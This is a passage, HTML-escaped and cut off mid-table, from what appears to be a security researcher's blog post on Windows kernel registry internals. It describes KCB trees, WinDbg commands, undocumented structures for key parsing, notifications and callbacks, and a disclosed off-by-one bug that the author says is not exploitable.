 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;If you&amp;#39;d like to dive deeper into the implementation of KCB tree traversal, I recommend analyzing the internal function CmpFindKcbInHashEntryByName, which performs a single step through the tree as described above. Another useful function to analyze is CmpPerformCompleteKcbCacheLookup, which recursively searches the tree to find the deepest KCB object corresponding to one of the elements of a given path.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;For those experimenting in WinDbg, here are a few useful commands related to KCBs and their trees:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_twe3knjlgokg-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;!reg findkcb:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This command finds the address of the KCB in the global tree that corresponds to the given fully qualified registry path, if it exists.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;!reg querykey:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Similar to the command above, but in addition to providing the KCB address, it also prints the hive descriptor address, the corresponding key node address, and information about subkeys and values of the given key.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;!reg kcb:&lt;/span&gt;&lt;span&gt;&amp;nbsp;This command prints basic information about a key based on its KCB. Its advantage is that it translates flag names into their textual equivalents (e.g., CompressedName, NoDelete, HiveEntry, etc.), but it often doesn&amp;#39;t provide the specific information one is looking for. In that case, it might be necessary to use the dt _CM_KEY_CONTROL_BLOCK command to dump the entire structure.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 class=&quot;tTszyzmaCA-c40 tTszyzmaCA-c13&quot; id=&quot;h.fqbx9ad0c5yz&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c58 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;Other structures&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;So far, t&lt;/span&gt;&lt;span&gt;his blog post has described only a few of the most important registry structures,&lt;/span&gt;&lt;span&gt;&amp;nbsp;which are&lt;/span&gt;&lt;span&gt;&amp;nbsp;essential to know for anyone conducting research in this area.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, in total, there are over 150 different structures used in the Windows kernel and related to the registry&lt;/span&gt;&lt;span&gt;, and o&lt;/span&gt;&lt;span&gt;nly about half are documented through debug symbols or on Microsoft&amp;#39;s website.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;While it&amp;#39;s impossible to detail the operation and function of all of these structures in one article, this section aims to at least provide an overview of a majority of them, to note which of them are publicly available, and to briefly describe how they are used internally.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The layout of many structures corresponding to the most complex mechanisms is publicly unknown&lt;/span&gt;&lt;span&gt;&amp;nbsp;at the time of writing&lt;/span&gt;&lt;span&gt;&amp;nbsp;and requires significant time and energy to reconstruct.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Even then, the correct meaning of each field and flag cannot be guaranteed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, the information below should be used with caution and verified against the specific Windows version(s) in question&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;before relying on it in any way.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;tTszyzmaCA-c31 tTszyzmaCA-c13&quot; id=&quot;h.tia52i2p7yqd&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Key opening/creation&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c30 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Parse context&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c57&quot;&gt;&lt;span&gt;Given that the registry is integrated with the standard Windows object model, all operations on registry paths (both absolute and relative) must be performed through the standard NT Object Manager interface.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c48&quot;&gt;&lt;span&gt;For example, the NtCreateKey syscall calls the CmCreateKey helper function.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At this point, there are no further calls to Configuration Manager, but instead, there is a call to ObOpenObjectByNameEx (a more advanced version of &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/obopenobjectbyname-function&quot;&gt;ObOpenObjectByName&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Several levels down, the kernel will transfer execution back to the registry code, specifically to the CmpParseKey callback, which is the entry point responsible for handling all path operations (i.e., all key open/create actions).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that the CmCreateKey and CmpParseKey functions, which work together, cannot pass an arbitrary number of input and output arguments to each other.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;hey only have one pointer (ParseContext) at their disposal, which can serve as a communication channel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Thus, the agreement between these functions is that the pointer points to a special &amp;quot;parse context&amp;quot; structure, which has three main roles&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_exm17v4ppgu6-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span&gt;Pass the input configuration of a given operation, e.g. information about:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_exm17v4ppgu6-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;operation mode (open/create),&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;transactionality of the operation,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;following of &lt;/span&gt;&lt;span&gt;symbolic links,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;flags related to WOW64 functionality&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;optional &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;class&lt;/span&gt;&lt;span&gt;&amp;nbsp;data of the created key&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_exm17v4ppgu6-0&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span&gt;Pass some return information, such as whether the key was opened or created,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c48 c15 li-bullet-0&quot;&gt;&lt;span&gt;Cache certain information within a single &amp;quot;parse&amp;quot; request, e.g.:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_exm17v4ppgu6-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;information on whether registry virtualization is enabled for a given process,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;when following a symbolic link, a pointer to the originating hive descriptor, in order to check whether the given transition is allowed within the hive trust class,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c48 c14 li-bullet-0&quot;&gt;&lt;span&gt;when following a symbolic link, a pointer to the KCB of its target (or the closest possible ancestor).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Reconstructing the layout of this structure is a critical step in getting a better understanding of how the key opening/creation process works internally.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Path info&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;When a client references a key by name, one of the first actions taken by the CmpParseKey function (or more specifically, CmpDoParseKey) is to take the string representing that name (absolute or relative), break it into individual parts separated by backslashes, and calculate the 32-bit hashes for each of them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This ensures that parsing only occurs once and doesn&amp;#39;t need to be repeated.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The structure where the result of this operation is stored is called &amp;quot;path info&amp;quot;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;According to the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits&quot;&gt;documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a single registry path reference can contain a maximum of 32 levels of nesting.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, the path info structure allows for the storage of 32 elements, in the following way: the first 8 elements being present directly within the structure, and if the path is deeply nested, an additional 24 elements within a supplementary structure allocated on-demand from kernel pools.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The functions that operate on this object are CmpComputeComponentHashes, CmpExpandPathInfo, CmpValidateComponents, CmpGetComponentNameAtIndex, CmpGetComponentHashAtIndex, and CmpCleanupPathInfo.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Interestingly, I discovered an off-by-one bug in the CmpComputeComponentHashes function, which allows an attacker to write 25 values into a 24-element array.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, due to a fortunate coincidence, path info structures are allocated from a special lookaside list with allocation sizes significantly larger than the length of the structure itself.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, this buffer overflow is not exploitable in practice, which has also been confirmed by Microsoft.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;More information about this issue, as well as the reversed definition of this structure, can be found in &lt;/span&gt;&lt;span&gt;my&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/03_CmpComputeComponentHashes_nested_path_overflow&quot;&gt;original report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;tTszyzmaCA-c31 tTszyzmaCA-c13&quot; id=&quot;h.kbo38se58js9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Key notifications&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_NOTIFY_BLOCK&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The first time &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regnotifychangekeyvalue&quot;&gt;RegNotifyChangeKeyValue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or the underlying &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntnotifychangemultiplekeys&quot;&gt;NtNotifyChangeMultipleKeys&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;syscall is called on a given handle, a notify block structure is assigned to the corresponding key body object. This structure serves as the central control point for all notification requests made on that handle in the future. It also stores the configuration defined in the initial API call, which, once set, cannot be changed without closing and reopening the key. This is in line with the official MSDN documentation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c44 tTszyzmaCA-c54&quot;&gt;&amp;quot;This function should not be called multiple times with the same value for the hKey but different values for the bWatchSubtree and dwNotifyFilter parameters. The function will succeed but the changes will be ignored. To change the watch parameters, you must first close the key handle by calling RegCloseKey, reopen the key handle by calling RegOpenKeyEx, and then call RegNotifyChangeKeyValue with the new parameters.&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c54 tTszyzmaCA-c44&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The !reg notifylist command in WinDbg can list all active notify blocks in the system, allowing you to check which keys are currently being monitored for changes.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Post block&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Each post block object corresponds to a single wait for changes to a given key. Many post block objects can be assigned to one notify block object at the same time. The network of relationships in this structure becomes even more complex when using the NtNotifyChangeMultipleKeys syscall with a non-empty SubordinateObjects argument, in which case two separate post blocks share a third data structure (the so-called post block union). However, the details of this topic are beyond the scope of this post.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The WinDbg !reg postblocklist command allows you to see how many active post blocks are assigned to each process/thread, but unfortunately, it does not show any detailed information about their contents.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;tTszyzmaCA-c31 tTszyzmaCA-c13&quot; id=&quot;h.7913uvetzmog&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Registry callbacks&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;REG_*_INFORMATION &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;These structures are used for supplying callbacks with precise information about operations performed on the registry, and are part of the documented Windows interface.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consequently, not only their definitions but also detailed descriptions of the meaning of each field are published directly by Microsoft.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A complete list of these structures can be found on MSDN, e.g., on the&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-ex_callback_function&quot;&gt;&amp;nbsp;EX_CALLBACK_FUNCTION callback function (wdm.h)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;page.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;However, I have found in my research that in addition to the official registry callback interface, there is also a less official extension &lt;/span&gt;&lt;span&gt;that Microsoft uses internally in VRegDriver, the module that supports differencing hives&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If a given client, instead of using the official &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex&quot;&gt;CmRegisterCallbackEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function, calls the internal CmpRegisterCallbackInternal function with the fifth argument set to 1, this callback will be internally marked as &amp;quot;extended&amp;quot;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Extended callbacks, in addition to the information provided by the standard structures, also receive a handful of additional information related to differencing hives and layered keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At the time of writing, the differences occur in the structures representing the RegNtPreLoadKey, RegNtPreCreateKeyEx, RegNtPreOpenKeyEx actions and their &amp;quot;post&amp;quot; counterparts.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Callback descriptor &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
